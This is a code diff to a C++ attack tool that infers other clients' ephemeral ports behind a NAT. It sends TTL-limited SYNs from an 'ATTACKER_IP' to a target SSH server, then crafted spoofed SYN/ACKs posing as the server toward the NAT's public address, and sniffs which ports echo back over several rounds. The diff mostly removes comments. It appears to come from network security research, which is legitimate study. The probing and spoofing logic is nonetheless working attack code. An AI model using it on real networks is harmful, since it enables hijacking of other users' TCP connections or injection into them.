@@ -1,5 +1,4 @@
-// Build:  make -f Makefile.infer     (or: g++ -O3 -o port_infer port_infer.cpp -pthread -ltins -std=c++17)
-// Run:    sudo ./port_infer
+// client ephemeral-port inference in NAT. Build: make. Run: sudo ./port_infer
 
 #include <iostream>
 #include <vector>
@@ -15,11 +14,11 @@
 using namespace std;
 using namespace Tins;
 
-// ---------- CONFIG (from port_infer1.py) ----------
-static string   ATTACKER_IP = "192.168.8.7";   // attacker's private IP in the NATed LAN
-static string   SERVER_IP   = "20.0.0.2";   // target server IP
-static uint16_t SERVER_PORT = 22;             // target server port
-static string   NAT_IP      = "20.0.0.1";    // NAT public IP
+// ---------- CONFIG ----------
+static string   ATTACKER_IP = "192.168.8.7";
+static string   SERVER_IP   = "20.0.0.2";
+static uint16_t SERVER_PORT = 22;
+static string   NAT_IP      = "20.0.0.1";
 static string   IFACE       = "wlo1";
 static uint16_t START_PORT  = 32768;
 static uint16_t END_PORT    = 65535;
@@ -27,27 +26,24 @@ static int      TTL_SYN     = 2;
 static int      TTL_SYNACK  = 4;
 static uint32_t SEQ_C       = 1000;
 static uint32_t SEQ_S       = 2000;
-static int      ROUNDS      = 3;      // confirmation rounds a port must miss to count as in-use
-static int      BATCH       = 1000;   // ports per batch (small bursts -> low packet loss)
-static int      SEND_GAP_US = 10;     // inter-packet spacing while blasting
-static int      SETTLE_US   = 100000; // gap between SYN blast and SYN/ACK blast within a batch (0.1 s)
-static int      WAIT_US     = 200000; // final drain wait after last batch each round (0.2 s)
-// --------------------------------------------------
+static int      ROUNDS      = 3;
+static int      BATCH       = 1000;
+static int      SEND_GAP_US = 10;
+static int      SETTLE_US   = 100000;
+static int      WAIT_US     = 200000;
+// ----------------------------
 
 static int NPORTS;
-static vector<char> received;         // received[p-START_PORT] = 1 if SYN/ACK came back to us
+static vector<char> received;
 static atomic<bool> done_flag{false};
-
-static vector<IP> syn_pkts;           // attacker -> server, SYN
-static vector<IP> synack_pkts;        // server   -> nat,    SYN/ACK
+static vector<IP> syn_pkts;
+static vector<IP> synack_pkts;
+static IPv4Address g_server, g_attacker;
 
 static double now_ms() {
     struct timeval t; gettimeofday(&t, nullptr);
     return t.tv_sec * 1000.0 + t.tv_usec / 1000.0;
 }
-
-// ---- sniffer: record dport of SYN/ACKs from server -> attacker ----
-static IPv4Address g_server, g_attacker;
 
 static bool on_packet(const PDU& pdu) {
     const IP*  ip  = pdu.find_pdu<IP>();
@@ -69,12 +65,11 @@ static void sniff_thread() {
                    to_string(SERVER_PORT) + " and (tcp[13] & 0x12) == 0x12 and dst host " +
                    ATTACKER_IP);
     cfg.set_immediate_mode(true);
-    cfg.set_buffer_size(64u << 20); // 64 MB kernel capture buffer to survive reply bursts
+    cfg.set_buffer_size(64u << 20);
     Sniffer sniffer(IFACE, cfg);
     sniffer.sniff_loop(on_packet);
 }
 
-// ---- prebuild all packets once ----
 static void build_packets() {
     syn_pkts.reserve(NPORTS);
     synack_pkts.reserve(NPORTS);
@@ -181,39 +176,31 @@ int main(int argc, char** argv) {
     }
 
     thread sniffer(sniff_thread);
-    usleep(100000); // let the sniffer come up
+    usleep(100000);
 
     PacketSender sender;
     NetworkInterface nic(IFACE);
     double t0 = now_ms();
 
-    // candidates start as the full range; each round we re-probe only the
-    // ports that have NOT returned yet. A port surviving all ROUNDS is in use.
     vector<uint16_t> candidates(NPORTS);
     for (int i = 0; i < NPORTS; i++) candidates[i] = START_PORT + i;
 
     for (int r = 0; r < ROUNDS && !candidates.empty(); r++) {
         double rt = now_ms();
-        // Process candidates in small batches so each SYN/ACK reply burst stays
-        // small (low capture/NAT loss). The sniffer runs continuously across all
-        // batches; we only tally which ports returned after the whole round.
         for (size_t off = 0; off < candidates.size(); off += BATCH) {
             size_t end = min(off + (size_t)BATCH, candidates.size());
-            // Stage 1: SYNs attacker -> server (create NAT mappings for this batch)
             for (size_t i = off; i < end; i++) {
                 sender.send(syn_pkts[candidates[i] - START_PORT], nic);
                 if (SEND_GAP_US) usleep(SEND_GAP_US);
             }
-            usleep(SETTLE_US); // let the mappings settle before the crafted SYN/ACKs
-            // Stage 2: crafted SYN/ACKs server -> nat
+            usleep(SETTLE_US);
             for (size_t i = off; i < end; i++) {
                 sender.send(synack_pkts[candidates[i] - START_PORT], nic);
                 if (SEND_GAP_US) usleep(SEND_GAP_US);
             }
         }
-        usleep(WAIT_US); // let the last batch's replies drain
+        usleep(WAIT_US);
 
-        // keep only ports that did NOT come back (tallied at round end)
         vector<uint16_t> still_missing;
         still_missing.reserve(candidates.size());
         for (uint16_t p : candidates)
@@ -232,7 +219,6 @@ int main(int argc, char** argv) {
     cout << compress_ranges(candidates) << "\n";
     cout << "total time: " << (now_ms() - t0) << " ms\n";
 
-    // nudge the sniffer's blocking loop to exit
     sender.send(synack_pkts[0], nic);
     usleep(50000);
     sniffer.detach();
